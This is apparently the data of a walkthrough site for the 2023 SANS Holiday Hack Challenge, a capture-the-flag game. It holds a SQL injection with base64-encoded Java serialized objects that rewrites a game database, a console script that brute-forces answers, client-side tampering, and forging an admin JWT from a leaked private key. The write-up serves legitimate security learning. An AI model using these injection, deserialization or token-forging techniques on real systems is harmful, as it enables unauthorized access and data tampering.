dependency to your <code>pom.xml</code> file:</li> </ol> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;\n    &lt;version&gt;2.13.0&lt;/version&gt; &lt;!-- Use the latest version available --&gt;\n&lt;/dependency&gt;\n</code></pre> <ol> <li>Use Jackson to convert your Java object to JSON:</li> </ol> <pre><code>import com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class MyObject {\n    private String name;\n    private int age;\n\n    // getters and setters\n\n    public static void main(String[] args) throws Exception {\n        MyObject myObject = new MyObject();\n        myObject.setName(\"John\");\n        myObject.setAge(25);\n\n        // Convert Java object to JSON\n        ObjectMapper objectMapper = new ObjectMapper();\n        String jsonString = objectMapper.writeValueAsString(myObject);\n\n        System.out.println(\"JSON String: \" + jsonString);\n    }\n}\n</code></pre> <p>In this example, you can now take the <code>jsonString</code> and use it as input for a user interface or any other text-based communication.</p> <p>If your use case requires binary data, consider encoding it as a Base64 string before putting it into a text field. Keep in mind that this is not a recommended practice for all situations, and the choice depends on the specific requirements of your application.</p> <p>Prompt: I am not writing an application, I am trying to input a java serialized object into the input field to see what happens. How can I achieve this?</p> <p>Response: If you are attempting to input a serialized Java object directly into a text field for experimental purposes or testing, you can follow these steps:</p> <ol> <li> <p>Serialize the Object:    Use Java's <code>ObjectOutputStream</code> to serialize your object into a byte array. Here's a simple example:</p> <pre><code>import java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\n\npublic class SerializationExample {\n    public static void main(String[] args) throws Exception {\n        // Create a sample object to serialize\n        SerializableObject obj = new SerializableObject(\"John Doe\", 30);\n\n        // Serialize the object to a byte array\n        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectStream = new ObjectOutputStream(byteStream);\n        objectStream.writeObject(obj);\n        objectStream.close();\n\n        byte[] serializedData = byteStream.toByteArray();\n\n        // Print the serialized data as a string (for easy input)\n        String serializedString = new String(serializedData);\n        System.out.println(\"Serialized String: \" + serializedString);\n    }\n}\n\nclass SerializableObject implements Serializable {\n    private String name;\n    private int age;\n\n    public SerializableObject(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    // Getters and setters\n}\n</code></pre> </li> </ol> <p>Run this program to obtain the serialized string.</p> <ol> <li> <p>Input Serialized String:    Copy the serialized string and paste it into the input field.</p> </li> <li> <p>Deserialization:    If you have control over the receiving end (e.g., another Java program), you can then deserialize the string back into an object using <code>ObjectInputStream</code>. This is usually done in a separate program.</p> <pre><code>import java.io.ByteArrayInputStream;\nimport java.io.ObjectInputStream;\n\npublic class DeserializationExample {\n    public static void main(String[] args) throws Exception {\n        // Replace serializedString with the actual serialized string\n        String serializedString = \"YOUR_SERIALIZED_STRING_HERE\";\n\n        // Convert the serialized string back to a byte array\n        byte[] serializedData = serializedString.getBytes();\n\n        // Deserialize the byte array to an object\n        ByteArrayInputStream byteStream = new ByteArrayInputStream(serializedData);\n        ObjectInputStream objectStream = new ObjectInputStream(byteStream);\n\n        SerializableObject deserializedObject = (SerializableObject) objectStream.readObject();\n\n        // Use the deserialized object as needed\n        System.out.println(\"Deserialized Object: \" + deserializedObject.getName() + \", \" + deserializedObject.getAge());\n    }\n}\n</code></pre> </li> </ol> <p>Please note that deserializing data received from an untrusted source can pose security risks (serialization vulnerabilities). In a real-world scenario, you should avoid directly inputting serialized objects from untrusted sources.</p> <p>Prompt: The output of the serialization example contains illegal characters. How can I fix this while preserving the serialized object?</p> <p>Response: When you serialize an object and convert the resulting byte array to a string, you might encounter issues with illegal characters, especially if the byte array contains non-printable or special characters. To address this, you can encode the byte array into a printable format, such as Base64, before converting it to a string. This way, you can safely include the serialized data in a text field.</p> <p>Here's how you can modify the SerializationExample to use Base64 encoding:</p> <pre><code>import java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\nimport java.util.Base64;\n\npublic class SerializationExample {\n    public static void main(String[] args) throws Exception {\n        // Create a sample object to serialize\n        SerializableObject obj = new SerializableObject(\"John Doe\", 30);\n\n        // Serialize the object to a byte array\n        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectStream = new ObjectOutputStream(byteStream);\n        objectStream.writeObject(obj);\n        objectStream.close();\n\n        // Encode the byte array using Base64\n        String base64Encoded = Base64.getEncoder().encodeToString(byteStream.toByteArray());\n\n        // Print the Base64 encoded string\n        System.out.println(\"Base64 Encoded String: \" + base64Encoded);\n    }\n}\n\nclass SerializableObject implements Serializable {\n    private String name;\n    private int age;\n\n    public SerializableObject(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    // Getters and setters\n}\n</code></pre> <p>Now, the <code>base64Encoded</code> string is safe to include in a text field. When you want to deserialize it, you can decode the Base64 string back to a byte array before deserialization. Update the DeserializationExample accordingly:</p> <pre><code>import java.io.ByteArrayInputStream;\nimport java.io.ObjectInputStream;\nimport java.util.Base64;\n\npublic class DeserializationExample {\n    public static void main(String[] args) throws Exception {\n        // Replace base64Encoded with the actual Base64 encoded string\n        String base64Encoded = \"YOUR_BASE64_ENCODED_STRING_HERE\";\n\n        // Decode the Base64 string to a byte array\n        byte[] decodedData = Base64.getDecoder().decode(base64Encoded);\n\n        // Deserialize the byte array to an object\n        ByteArrayInputStream byteStream = new ByteArrayInputStream(decodedData);\n        ObjectInputStream objectStream = new ObjectInputStream(byteStream);\n\n        SerializableObject deserializedObject = (SerializableObject) objectStream.readObject();\n\n        // Use the deserialized object as needed\n        System.out.println(\"Deserialized Object: \" + deserializedObject.getName() + \", \" + deserializedObject.getAge());\n    }\n}\n</code></pre> <p>This way, you can safely pass the Base64-encoded string between different components, preserving the serialized object while avoiding issues with illegal characters.</p> <p>Here is the java program I created with the help of ChatGPT:</p> Serialize.java <pre><code>import java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.util.Base64;\n\npublic class Serialize {\n    public static void main(String[] args) throws Exception {\n        // Create a sample object to serialize\n        SatelliteQueryFileFolderUtility obj = new SatelliteQueryFileFolderUtility(args[0], !args[0].equals(\"false\"), !args[0].equals(\"false\"));\n\n        // Serialize the object to a byte array\n        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectStream = new ObjectOutputStream(byteStream);\n        objectStream.writeObject(obj);\n        objectStream.close();\n\n        // Encode the byte array using Base64\n        String base64Encoded = Base64.getEncoder().encodeToString(byteStream.toByteArray());\n\n        // Print the Base64 encoded string\n        System.out.println(\"Base64 Encoded String: \" + base64Encoded);\n    }\n}\n</code></pre> SatelliteQueryFileFolderUtility.java (found in the satellite database response) <pre><code>import com.google.gson.Gson;\n\nimport java.io.IOException;\nimport java.io.Serializable;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.stream.Collectors;\nimport java.util.stream.Stream;\n\npublic class SatelliteQueryFileFolderUtility implements Serializable {\n    private String pathOrStatement;\n    private boolean isQuery;\n    private boolean isUpdate;\n\n    public SatelliteQueryFileFolderUtility(String pathOrStatement, boolean isQuery, boolean isUpdate) {\n        this.pathOrStatement = pathOrStatement;\n        this.isQuery = isQuery;\n        this.isUpdate = isUpdate;\n    }\n\n    public String getResults(Connection connection) {\n        if (isQuery &amp;&amp; connection != null) {\n            if (!isUpdate) {\n                try (PreparedStatement selectStmt = connection.prepareStatement(pathOrStatement);\n                     ResultSet rs = selectStmt.executeQuery()) {\n                    List&lt;HashMap&lt;String, String&gt;&gt; rows = new ArrayList&lt;&gt;();\n                    while(rs.next()) {\n                        HashMap&lt;String, String&gt; row = new HashMap&lt;&gt;();\n                        for (int i = 1; i &lt;= rs.getMetaData().getColumnCount(); i++) {\n                            String key = rs.getMetaData().getColumnName(i);\n                            String value = rs.getString(i);\n                            row.put(key, value);\n                        }\n                        rows.add(row);\n                    }\n                    Gson gson = new Gson();\n                    String json = gson.toJson(rows);\n                    return json;\n                } catch (SQLException sqle) {\n                    return \"SQL Error: \" + sqle.toString();\n                }\n            } else {\n                try (PreparedStatement pstmt = connection.prepareStatement(pathOrStatement)) {\n                    pstmt.executeUpdate();\n                    return \"SQL Update completed.\";\n                } catch (SQLException sqle) {\n                    return \"SQL Error: \" + sqle.toString();\n                }\n            }\n        } else {\n            Path path = Paths.get(pathOrStatement);\n            try {\n                if (Files.notExists(path)) {\n                    return \"Path does not exist.\";\n                } else if (Files.isDirectory(path)) {\n                    // Use try-with-resources to ensure the stream is closed after use\n                    try (Stream&lt;Path&gt; walk = Files.walk(path, 1)) { // depth set to 1 to list only immediate contents\n                        return walk.skip(1) // skip the directory itself\n                                .map(p -&gt; Files.isDirectory(p) ? \"D: \" + p.getFileName() : \"F: \" + p.getFileName())\n                                .collect(Collectors.joining(\"\\n\"));\n                    }\n                } else {\n                    // Assume it's a readable file\n                    return new String(Files.readAllBytes(path), StandardCharsets.UTF_8);\n                }\n            } catch (IOException e) {\n                return \"Error reading path: \" + e.toString();\n            }\n        }\n    }\n\n    public String getpathOrStatement() {\n        return pathOrStatement;\n    }\n}\n</code></pre> <p>Using this, you can check your permissions again through the new java serialized object.</p> <p>Create serialized object.</p> <pre><code>java -jar Serialize-1.0-SNAPSHOT.jar \"SHOW GRANTS;\" true false\n</code></pre> <p>Use serialized object.</p> <pre><code>; INSERT satellite_query SET object=FROM_BASE64('rO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1ZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAEAdAAMU0hPVyBHUkFOVFM7')\n</code></pre> <p>Check response.</p> <pre><code>; SELECT * FROM satellite_query;\n</code></pre> <p>Response intercepted by wireshark.</p> <pre><code>object: ... | results: [...,{\"Grants for targeter_admin@%\":\"GRANT SELECT, UPDATE ON `missile_targeting_system`.`pointing_mode` TO `targeter_admin`@`%`\"},...]\n</code></pre> <p>Now we can update the <code>pointing_mode</code>. Since it's current value is 0, 1 will probably point it at the sun instead of the earth.</p> <pre><code>java -jar Serialize-1.0-SNAPSHOT.jar \"UPDATE pointing_mode SET numerical_mode=1;\" true true\n</code></pre> <pre><code>; INSERT satellite_query SET object=FROM_BASE64('rO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1ZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAEBdAApVVBEQVRFIHBvaW50aW5nX21vZGUgU0VUIG51bWVyaWNhbF9tb2RlPTE=')\n</code></pre> <p>Checking the <code>Pointing Mode</code> parameter shows that we were successful. The missile will now point towards the sun.</p> <p></p> <p>Answer</p> <p>Use SQL injection and Java object serialization to alter the trajectory of the missile.</p>"},{"location":"objectives/missile_diversion/#response","title":"Response","text":"<p>Wombley Cube</p> <p>A... missile... aimed for Santa's sleigh? I had no idea... I can't believe I was manipulated like this. I've been trained to recognize these kinds of tactics! Santa should never have put the holiday season at risk like he did, but I didn't know Jack's true intentions. I'll help you bring Jack to justice... But my mission to ensure Santa never again compromises the holidays is still in progress. It sounded like the satellite crashed. Based on the coordinates, looks like the crash site is right near Rudolph's Rest. Use the door to the right to return to the resort lobby and see what happened! Don't worry, I'll meet you there... trust me.</p>"},{"location":"objectives/na_an/","title":"Na'an","text":"<p>Difficulty:  Direct link: Na'an Terminal</p>"},{"location":"objectives/na_an/#objective","title":"Objective","text":"<p>Request</p> <p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win!</p> Shifty McShuffles <p>Hey there, stranger! Fancy a game of cards? Luck's on your side today, I can feel it. Step right up, test your wit! These cards could be your ticket to fortune. Trust me, I've got a good eye for winners, and you've got the look of luck about you. Plus, I'd wager you've never played this game before, as this isn't any ordinary deck of cards. It's made with Python. The name of the game is to bamboozle the dealer. So whad'ya think? Are you clever enough?</p>"},{"location":"objectives/na_an/#hints","title":"Hints","text":"The Upper Hand <p>Shifty said his deck of cards is made with Python. Surely there's a weakness to give you the upper hand in his game.</p> Stump the Chump <p>Try to outsmart Shifty by sending him an error he may not understand.</p>"},{"location":"objectives/na_an/#solution","title":"Solution","text":"<p>First, read the instructions.</p> <p></p> <p>To win a game, pick <code>0</code> as the lowest and <code>NaN</code> as the highest. You must also pick <code>9</code>, but the other two cards don't matter.</p> <p></p> <p>Each game will give you 2 points. To complete the challenge, repeat this proccess 5 times.</p> <p>Answer</p> <p>NaN</p>"},{"location":"objectives/na_an/#response","title":"Response","text":"<p>Shifty McShuffles</p> <p>Well, you sure are more clever than most of the tourists that show up here. I couldn't swindle ya, but don't go telling everyone how you beat me! An elf's gotta put food on the table somehow, and I'm doing the best I can with what I got.</p>"},{"location":"objectives/orientation/","title":"Holiday Hack Orientation","text":"<p>Difficulty:  Direct link: Orientation Terminal</p>"},{"location":"objectives/orientation/#objective","title":"Objective","text":"<p>Request</p> <p>Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands</p> Jingle Ringford <p>Welcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge! I'm Jingle Ringford, one of Santa's many elves. Santa asked me to meet you here and give you a short orientation to this festive event. Before you head back to your boat, I'll ask you to accomplish a few simple tasks.</p>"},{"location":"objectives/orientation/#solution","title":"Solution","text":"<p>Talk to Jingle Ringford and follow his instructions.</p> <p>Jingle Ringford</p> <p>First things first, here's your badge! It's that starfish in the middle of your avatar. Great - now you're official! Click on the badge on your avatar. That's where you will see your Objectives, Hints, and Conversations for the Holiday Hack Challenge. We've also got handy links to some awesome talks and more there for you!</p> <p>Click on the starfish badge on your avatar.</p> <p>Jingle Ringford</p> <p>Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions.</p> <p>Click on the terminal and submit \"answer\" in the top pane.</p> <p></p> <p>After hitting enter, the terminal should close automatically.</p> <p>Answer</p> <p>Dock your boat and follow Jingle Ringford's instructions.</p>"},{"location":"objectives/orientation/#response","title":"Response","text":"<p>Jingle Ringford</p> <p>Perfect! Your orientation is now complete! Head back to your boat or click on the anchor icon on the left of the screen to set sail for Frosty's Beach where Santa's waiting for you. I've updated your boat's compass to guide the way. As you sail to each island, talk to the goose of that island to receive a colorful lei festooning the masts on your ship. Safe travels my friend and remember, relax, enjoy the sun, and most importantly, have FUN!</p>"},{"location":"objectives/phish_detection_agency/","title":"Phish Detection Agency","text":"<p>Difficulty:  Direct link: Phish Detection Agency Terminal</p>"},{"location":"objectives/phish_detection_agency/#objective","title":"Objective","text":"<p>Request</p> <p>Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad!</p> Fitzy Shortstack <p>Just my luck, I thought... A cybersecurity incident right in the middle of this stakeout. Seems we have a flood of unusual emails coming in through ChatNPT. Got a nagging suspicion it isn't catching all the fishy ones. You're our phishing specialist right? Could use your expertise in looking through the output of ChatNPT. Not suggesting a full-blown forensic analysis, just mark the ones screaming digital fraud. We're looking at all this raw data, but sometimes, it takes a keen human eye to separate the chaff, doesn't it? I need to get more powdered sugar for my donuts, so do ping me when you have something concrete on this.</p>"},{"location":"objectives/phish_detection_agency/#hints","title":"Hints","text":"DMARC, DKIM, and SPF, oh my! <p>Discover the essentials of email security with DMARC, DKIM, and SPF at Cloudflare's Guide.</p>"},{"location":"objectives/phish_detection_agency/#solution","title":"Solution","text":"<p>To complete this challenge, simply mark the emails as phishing if they fail any of the checks.</p>"},{"location":"objectives/phish_detection_agency/#safe-email","title":"Safe Email","text":""},{"location":"objectives/phish_detection_agency/#phishing-emails","title":"Phishing Emails","text":"<p>Failed DMARC:</p> <p></p> <p>Wrong domain: </p>"},{"location":"objectives/phish_detection_agency/#success","title":"Success","text":"<p>Answer</p> <p>Figure out which emails are phishing attempts.</p>"},{"location":"objectives/phish_detection_agency/#response","title":"Response","text":"<p>Fitzy Shortstack</p> <p>You've cracked the case! Once again, you've proven yourself to be an invaluable asset in our fight against these digital foes.</p>"},{"location":"objectives/reportinator/","title":"Reportinator","text":"<p>Difficulty:  Direct link: Reportinator Terminal</p>"},{"location":"objectives/reportinator/#objective","title":"Objective","text":"<p>Request</p> <p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up.</p> Noel Boetie <p>Hey there, Noel Boetie speaking! I recently tried using ChatNPT to generate my penetration testing report. It's a pretty nifty tool, but there are a few issues in the output that I've noticed. I need some guidance in finding any errors in the way it generated the content, especially those odd hallucinations in the LLM output. I know it's not perfect, but I'd really appreciate the extra eyes on this one. Some of the issues might be subtle, so don't be afraid to dig deep and ask for further clarification if you're unsure. I've heard that you folks are experts about LLM outputs and their common issues, so I trust you can help me with this. Your input will be invaluable to me, so please feel free to share any insights or findings you may have. I'm looking forward to working with you all and improving the quality of the ChatNPT-generated penetration testing report. Thanks in advance for your help! I truly appreciate it! Let's make this report the best it can be!</p>"},{"location":"objectives/reportinator/#solution","title":"Solution","text":"<p>For this challenge you have to figure out which reports are hallucinations and which are real. This can be hard to do, so instead, you can paste this into the console and set the context to <code>Reportinator</code>.</p> <pre><code>var sendCheck = function(values) {\n  var data = {};\n  var i = 0;\n  document.querySelectorAll(\"[type='hidden']\").forEach(function(input) {\n    var name = input.getAttribute(\"name\");\n    var value = values[i];\n    data[name] = value;\n    i++\n  });\n\n  fetch('/check', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/x-www-form-urlencoded',\n      },\n      body: new URLSearchParams(data).toString()\n    })\n    .then(response =&gt; response.json()) // Always parse the response as JSON\n    .then(data =&gt; {\n      if (data.error &amp;&amp; data.error === 'FAILURE') {\n        console.log(\"Failure, please try again.\");\n      } else {\n        updateWebContent();\n        __POST_RESULTS__(data);\n      }\n    })\n    .catch(error =&gt; {\n      console.log(\"Error: \" + error.message);\n    });\n}\n\nfor(var i = 0; i &lt; 512; i++) {\n  sendCheck([i &amp; 1, (i &gt;&gt; 1) &amp; 1, (i &gt;&gt; 2) &amp; 1, (i &gt;&gt; 3) &amp; 1, (i &gt;&gt; 4) &amp; 1, (i &gt;&gt; 5) &amp; 1, (i &gt;&gt; 6) &amp; 1, (i &gt;&gt; 7) &amp; 1, (i &gt;&gt; 8) &amp; 1]);\n  setTimeout(() =&gt; {}, 100);\n}\n</code></pre> <p></p> <p>After a few seconds, the challenge is complete.</p> <p></p> <p>Answer</p> <p>Figure out which sections are AI hallucinations.</p>"},{"location":"objectives/reportinator/#response","title":"Response","text":"<p>Noel Boetie</p> <p>Great job on completing that challenge! Ever thought about how your newfound skills might come into play later on? Keep that mind sharp, and remember, today's victories are tomorrow's strategies! </p>"},{"location":"objectives/snowball_fight/","title":"Snowball Fight","text":"<p>Difficulty:  Direct link: Snowball Fight Terminal</p>"},{"location":"objectives/snowball_fight/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!</p> Morcel Nougat <p>Hey there, I'm Morcel Nougat, elf extraordinaire! You won't believe this, but we're on a magical tropical island called Christmas Island, and it even has snow! I'm so glad ChatNPT suggested we come here this year! Santa, some elves, and I are having a snowball fight, and we'd love you to join us. Santa's really good, so trust me when I say it's way more fun when played with other people. But hey, if you can figure out a way to play solo by tinkering with client side variables or parameters to go solo mode, go for it! There's also ways to make the elves' snowballs do no damage, and all kinds of other shenanigans, but you didn't hear that from me. Just remember, it's all about having fun and sharing the joy of the holiday season with each other. So, are you in? We'd really love your company in this epic snowball battle!</p>"},{"location":"objectives/snowball_fight/#hints","title":"Hints","text":"Consoling iFrames <p>Have an iframe in your document? Be sure to select the right context before meddling with JavaScript.</p> Snowball Super Hero <p>Its easiest to grab a friend play with and beat Santa but tinkering with client-side variables can grant you all kinds of snowball fight super powers. You could even take on Santa and the elves solo!</p>"},{"location":"objectives/snowball_fight/#solution","title":"Solution","text":"<p>Open the terminal and play the game. Set the mode to \"VS SANTA\" and select \"CREATE PRIVATE ROOM\".</p> <p></p> <p>In the address bar, change <code>singlePlayer=false</code> to <code>singlePlayer=true</code> and reload the page.</p> <p></p> <p>Throw snowballs at the elves and Santa until you are the last one standing. If you couldn't beat Santa, you can always disable damage using the developer console by replacing the <code>player.takeHit</code> function.</p> <p></p> <p>Answer</p> <p>Hack the snowball fight game to beat Santa.</p>"},{"location":"objectives/snowball_fight/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>You're like a snowball fighting ninja! A real-life legend. Can I have your autograph!?</p>"},{"location":"objectives/the_captains_comms/","title":"The Captain's Comms","text":"<p>Difficulty:  Direct link: Captain's Comms Terminal</p>"},{"location":"objectives/the_captains_comms/#objective","title":"Objective","text":"<p>Request</p> <p>Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role.</p> Chimney Scissorsticks <p>Ahoy there, I'm Chimney Scissorsticks! You may have noticed some mischief-makers planning to stir up trouble ashore. They've made many radio broadcasts which the captain has been monitoring with his new software defined radio (SDR). The new SDR uses some fancy JWT technology to control access. The captain has a knack for shortening words, some sorta abbreviation trick. Not familiar with JWT values? No worries; just think of it as a clue-solving game. I've seen that the Captain likes to carry his journal with him wherever he goes. If only I could find the planned \"go-date\", \"go-time\", and radio frequency they plan to use. Remember, the captain's abbreviations are your guiding light through this mystery! Once we find a JWT value, these villains won't stand a chance. The closer we are, the sooner we'll be thwarting their pesky plans! We need to recreate an administrative JWT value to successfully transmit a message. Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!</p>"},{"location":"objectives/the_captains_comms/#hints","title":"Hints","text":"Comms Abbreviations <p>I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.</p> Comms Web Interception Proxies <p>Web Interception proxies like Burp and Zap make web sites fun!</p> Comms Private Key <p>Find a private key, update an existing JWT!</p> Comms JWT Intro <p>A great introduction to JSON Web Tokens is available from Auth0.</p> Comms Journal <p>I've seen the Captain with his Journal visiting Pixel Island! </p>"},{"location":"objectives/the_captains_comms/#solution","title":"Solution","text":"<p>For this challenge, you must assume the GeeseIslandsSuperChiefCommunicationsOfficer role. To do this, look around the shack by clicking on the areas with yellow outlines.</p> <p></p> <p>The owner's card mentions a \"monitor token\" file located at <code>/jwtDefault/rMonitor.tok</code>. This file can be read by sending a request to the server with the current JWT token.</p> <p></p> <p>By replacing the cookie with this new token, you can access the SDR.</p> <p></p> <p>When you try to access more, you are shown the following message.</p> <p></p> <p>The decoder role is probably in the same folder and follows the same format as the monitor role. Checking <code>/jwtDefault/rDecoder.tok</code> using the monitor token confirms this.</p> <p></p> <p>Replace the cookie again and you can access the radio signals. The first one gives you a folder which contains the Captain's raido private key.</p> <p></p> <p>The second signal gives you a time and date. It is hidden between the {gong}s.</p> <p></p> <p>This is just the date repeated twice followed by the time repeated twice. Both numbers have an extra 9 added to the end of them. <pre><code>12/24 16:00\n</code></pre></p> <p>The last signal gives you the frequency.</p> <p></p> <p>Before broadcasting, you still need the Captain's token.</p> <p></p> <p>Looking in the Captain's To-Do list, you can see that he put the public key in a folder called <code>keys</code> and called the file <code>capsPubKey.key</code>.</p> <p></p> <p>The first radio signal earlier showed that his private key is in the <code>TH3CAPSPR1V4T3F0LD3R</code> folder. It probably follows the same filename format.</p> <p></p> <p>Now you can create the correct JWT token once you find the correct role after completing the Elf Hunt challenge.</p> <p></p> <p>Create the admin token and set the cookie back on the challenge website.</p> <p></p> <p>Finally, you can access the transmitter and input the frequency, go date, and go time. Make sure the go time is 4 hours earlier than what the attackers wanted.</p> <p></p> <p>Answer</p> <p>10426Hz 12/24 12:00</p>"},{"location":"objectives/the_captains_comms/#response","title":"Response","text":"<p>Chimney Scissorsticks</p> <p>Brilliant work! You've outsmarted those scoundrels with finesse!</p>"}]}